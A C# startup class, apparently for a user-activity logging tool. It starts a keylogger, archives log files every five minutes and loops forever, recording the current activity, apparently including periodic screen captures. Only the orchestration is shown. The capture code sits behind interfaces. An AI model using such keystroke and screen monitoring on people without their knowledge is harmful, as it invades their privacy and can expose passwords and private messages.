
using Core;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using FileSystem;

namespace UserActivityLogger
{
    public class StartUp : IStartUp
    {
        private TimeSpan _screenCaptureTimeInterval;
        private readonly IKeyLogger _keyLogger;
        private readonly IImageCommentEmbedder _imageCommentEmbedder;
        private readonly ICurrentActivityProvider _currentActivityProvider;
        private readonly IActivityRepositary _activityRepositary;
        private readonly ILogFileArchiver _logFileArchiver;

        public StartUp(IKeyLogger keyLogger,
            IImageCommentEmbedder imageCommentEmbedder,
            ICurrentActivityProvider currentActivityProvider,
            IActivityRepositary activityRepositary,
            ILogFileArchiver logFileArchiver)
        {
            _keyLogger = keyLogger;
            _imageCommentEmbedder = imageCommentEmbedder;
            _currentActivityProvider = currentActivityProvider;
            _activityRepositary = activityRepositary;
            _logFileArchiver = logFileArchiver;
        }

        public void Start(TimeSpan screenCaptureTimeInterval)
        {
            _keyLogger.StartListening();
            _logFileArchiver.Start( _activityRepositary.DataFolder, TimeSpan.FromMinutes(5));
          
            //Add one log when process started
            _activityRepositary.Add(_currentActivityProvider.GetActivity("Process Started"));

            while (true)
            {
                Thread.Sleep(screenCaptureTimeInterval);
                try
                {
                    var activity = _currentActivityProvider.GetActivity();
                    if (activity != null)
                    {
                        _activityRepositary.Add(activity);
                    }

                }
                catch (Exception ex)
                {
                    Logger.LogError(ex);
                }

            }
        }
    }
}
